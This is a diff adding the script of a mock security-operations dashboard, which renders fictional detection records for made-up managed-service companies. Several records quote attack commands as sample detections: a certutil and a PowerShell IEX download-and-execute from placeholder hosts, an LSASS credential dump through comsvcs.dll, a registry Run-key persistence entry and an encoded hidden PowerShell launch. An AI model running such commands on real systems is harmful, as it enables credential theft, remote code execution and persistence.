+        company: 'TechCorp MSP (fictional)',
+        command: 'powershell.exe -NoP -sta -NonI -W Hidden -Enc <base64_encoded_payload>',
+        notes: 'Encoded payload, hidden window flag. Matches LOTL evasion pattern.'
+      },
+      {
+        id: 'DET-8469',
+        type: 'Identity: Impossible Travel',
+        timestamp: '2026-06-04 13:58:42',
+        confidence: 91,
+        severity: 'high',
+        action: 'Escalate',
+        user: 'admin@securenet-services.local',
+        endpoint: 'N/A (Cloud)',
+        company: 'SecureNet Services (fictional)',
+        geo: 'Login from New York (US) and London (UK) within 45 minutes',
+        notes: 'Admin account accessed from two continents within physically impossible timeframe.'
+      },
+      {
+        id: 'DET-8465',
+        type: 'PowerShell: Living Off The Land Binary',
+        timestamp: '2026-06-04 12:14:09',
+        confidence: 86,
+        severity: 'high',
+        action: 'Investigate',
+        user: 'sysadmin@netguard-inc.local',
+        endpoint: 'LAPTOP-X9K1',
+        company: 'NetGuard Inc (fictional)',
+        command: 'certutil.exe -urlcache -split -f http://malicious-domain.example/payload.exe C:\\temp\\update.exe',
+        notes: 'Certutil used for file download. Legitimate Windows binary, LOTL technique.'
+      },
+      {
+        id: 'DET-8461',
+        type: 'Identity: Geo-Anomaly Detection',
+        timestamp: '2026-06-04 11:42:33',
+        confidence: 73,
+        severity: 'medium',
+        action: 'Monitor',
+        user: 'finance@cloudsafe-msp.local',
+        endpoint: 'N/A (Cloud)',
+        company: 'CloudSafe MSP (fictional)',
+        geo: 'Login from Romania (first-time location for this user)',
+        notes: 'User typically accesses from US West Coast. No travel notification in system.'
+      },
+      {
+        id: 'DET-8458',
+        type: 'PowerShell: Lateral Movement Attempt',
+        timestamp: '2026-06-04 10:29:15',
+        confidence: 81,
+        severity: 'critical',
+        action: 'Escalate',
+        user: 'backup_service@dataprotect-co.local',
+        endpoint: 'SERVER-DC01',
+        company: 'DataProtect Co (fictional)',
+        command: 'Invoke-Command -ComputerName FILESERVER01 -ScriptBlock {whoami; net user; ipconfig}',
+        notes: 'Service account executing remote commands. Reconnaissance pattern detected.'
+      },
+      {
+        id: 'DET-8453',
+        type: 'PowerShell: Credential Dumping',
+        timestamp: '2026-06-04 09:17:28',
+        confidence: 94,
+        severity: 'critical',
+        action: 'Escalate',
+        user: 'localadmin@infrashield-msp.local',
+        endpoint: 'WORKSTATION-B7Q3',
+        company: 'InfraShield MSP (fictional)',
+        command: 'rundll32.exe C:\\windows\\system32\\comsvcs.dll, MiniDump <lsass_pid> C:\\temp\\dump.dmp full',
+        notes: 'LSASS memory dump via comsvcs.dll. Classic LOTL credential theft technique.'
+      },
+      {
+        id: 'DET-8449',
+        type: 'Identity: Privilege Escalation',
+        timestamp: '2026-06-04 08:03:51',
+        confidence: 68,
+        severity: 'medium',
+        action: 'Monitor',
+        user: 'helpdesk@cyberops-llc.local',
+        endpoint: 'N/A (Cloud)',
+        company: 'CyberOps LLC (fictional)',
+        notes: 'Helpdesk user granted Domain Admin privileges. Role elevation detected by Signal Sync.'
+      },
+      {
+        id: 'DET-8445',
+        type: 'PowerShell: Obfuscated Command',
+        timestamp: '2026-06-04 06:48:12',
+        confidence: 77,
+        severity: 'medium',
+        action: 'Investigate',
+        user: 'update_service@guardtech-services.local',
+        endpoint: 'DESKTOP-N2M8',
+        company: 'GuardTech Services (fictional)',
+        command: 'powershell.exe -c "IEX (New-Object Net.WebClient).DownloadString(\'http://suspicious-site.example/script.ps1\')"',
+        notes: 'Download-and-execute pattern. String obfuscation detected.'
+      },
+      {
+        id: 'DET-8441',
+        type: 'Identity: After-Hours Access',
+        timestamp: '2026-06-04 02:14:07',
+        confidence: 58,
+        severity: 'low',
+        action: 'Monitor',
+        user: 'marketing@securewave-msp.local',
+        endpoint: 'N/A (Cloud)',
+        company: 'SecureWave MSP (fictional)',
+        notes: 'Marketing user accessed CRM at 2:14 AM (outside typical 8am-6pm pattern). Low confidence — may be legitimate remote work.'
+      },
+      {
+        id: 'DET-8437',
+        type: 'PowerShell: Registry Persistence',
+        timestamp: '2026-06-03 22:39:44',
+        confidence: 82,
+        severity: 'high',
+        action: 'Investigate',
+        user: 'guest@netdefend-inc.local',
+        endpoint: 'LAPTOP-K4V9',
+        company: 'NetDefend Inc (fictional)',
+        command: 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "Updater" /t REG_SZ /d "C:\\ProgramData\\system32.exe" /f',
+        notes: 'Registry Run key modification for persistence. Guest account should not have this capability.'
+      }
+    ];
+
+    // ===== Populate Detection Cards =====
+    function renderDetections() {
+      const container = document.getElementById('detections-list');
+      container.innerHTML = '';
+
+      detections.forEach(det => {
+        const card = document.createElement('div');
+        card.className = 'detection-card';
+        card.innerHTML = `
+          <div class="detection-header" data-toggle-detection>
+            <div class="detection-expand">▸</div>
+            <div class="detection-id">${det.id}</div>
+            <div class="detection-type">${det.type}</div>
+            <div class="detection-timestamp">${det.timestamp}</div>
+            <div class="detection-confidence tooltip" data-tooltip="Based on PowerShell Ensemble behavioral model">
+              <div class="confidence-bar">
+                <div class="confidence-fill" style="width: ${det.confidence}%"></div>
+              </div>
+              <span>${det.confidence}%</span>
+            </div>
+            <div class="detection-severity severity-${det.severity}">${det.severity.toUpperCase()}</div>
+            <div class="detection-action">${det.action}</div>
+          </div>
+          <div class="detection-details">
+            <div class="detail-grid">
+              <div class="detail-item">
+                <div class="detail-label">User</div>
+                <div class="detail-value">${det.user}</div>
+              </div>
+              <div class="detail-item">
+                <div class="detail-label">Endpoint</div>
+                <div class="detail-value">${det.endpoint}</div>
+              </div>
+              <div class="detail-item">
+                <div class="detail-label">Company</div>
+                <div class="detail-value">${det.company}</div>
+              </div>
+              ${det.geo ? `<div class="detail-item"><div class="detail-label">Geo-Location</div><div class="detail-value">${det.geo}</div></div>` : ''}
+            </div>
+            ${det.command ? `
+              <div class="detail-command">
+                <div class="detail-label">Command Executed</div>
+                <div class="command-block">${det.command}</div>
+              </div>
+            ` : ''}
+            <div style="margin-top: 12px;">
+              <div class="detail-label">Analysis Notes</div>
+              <div class="detail-value" style="color: var(--text-secondary); margin-top: 4px;">${det.notes}</div>
+            </div>
+          </div>
+        `;
+        container.appendChild(card);
+      });
+    }
+
+    // ===== Theme Toggle =====
+    const modeLight = document.getElementById('mode-light');
+    const modeDark = document.getElementById('mode-dark');
+    const modeSystem = document.getElementById('mode-system');
+
+    function setTheme(mode) {
+      document.querySelectorAll('.fidelity-mode-toggle button').forEach(btn => btn.classList.remove('active'));
+
+      if (mode === 'light') {
+        document.body.setAttribute('data-theme', 'light');
+        modeLight.classList.add('active');
+      } else if (mode === 'dark') {
+        document.body.setAttribute('data-theme', 'dark');
+        modeDark.classList.add('active');
+      } else {
+        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
+        document.body.setAttribute('data-theme', prefersDark ? 'dark' : 'light');
+        modeSystem.classList.add('active');
+      }
+
+      localStorage.setItem('apx-mode-pref', mode);
+    }
+
+    modeLight.addEventListener('click', () => setTheme('light'));
+    modeDark.addEventListener('click', () => setTheme('dark'));
+    modeSystem.addEventListener('click', () => setTheme('system'));
+
+    // Load theme preference
+    const savedMode = localStorage.getItem('apx-mode-pref') || 'dark';
+    setTheme(savedMode);
+
+    // Listen to system theme changes when in system mode
+    window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+      if (localStorage.getItem('apx-mode-pref') === 'system') {
+        document.body.setAttribute('data-theme', e.matches ? 'dark' : 'light');
+      }
+    });
+
+    // ===== Council Modal =====
+    const councilBtn = document.getElementById('council-btn');
+    const councilModal = document.getElementById('council-modal');
+    const modalCloseBtn = document.getElementById('modal-close-btn');
+
+    councilBtn.addEventListener('click', () => {
+      councilModal.classList.add('active');
+    });
+
+    function closeCouncilModal() {
+      councilModal.classList.remove('active');
+    }
+
+    modalCloseBtn.addEventListener('click', closeCouncilModal);
+
+    councilModal.addEventListener('click', (e) => {
+      if (e.target === councilModal) {
+        closeCouncilModal();
+      }
+    });
+
+    // ===== Rail Toggle (Responsive) =====
+    const railToggle = document.getElementById('rail-toggle');
+    railToggle.addEventListener('click', () => {
+      document.body.classList.toggle('rail-visible');
+    });
+
+    // ===== Rail Section Toggles =====
+    document.querySelectorAll('[data-toggle-section]').forEach(title => {
+      title.addEventListener('click', () => {
+        const section = title.parentElement;
+        section.classList.toggle('collapsed');
+      });
+    });
+
+    // ===== Detection Card Toggles (Event Delegation) =====
+    document.getElementById('detections-list').addEventListener('click', (e) => {
+      const header = e.target.closest('[data-toggle-detection]');
+      if (header) {
+        const card = header.parentElement;
+        card.classList.toggle('expanded');
+      }
+    });
+
+    // ===== Filters (Basic Functionality) =====
+    const applyFiltersBtn = document.getElementById('apply-filters');
+    applyFiltersBtn.addEventListener('click', () => {
+      const severity = document.getElementById('filter-severity').value;
+      const confidence = parseInt(document.getElementById('filter-confidence').value);
+
+      const cards = document.querySelectorAll('.detection-card');
+      cards.forEach(card => {
+        const cardSeverity = card.querySelector('.detection-severity').textContent.toLowerCase();
+        const cardConfidence = parseInt(card.querySelector('.detection-confidence span').textContent);
+
+        let show = true;
+        if (severity && cardSeverity !== severity) show = false;
+        if (cardConfidence < confidence) show = false;
+
+        card.style.display = show ? 'block' : 'none';
+      });
+    });
+
+    // ===== Initialize =====
+    renderDetections();
+  </script>
+
+</body>
+</html>
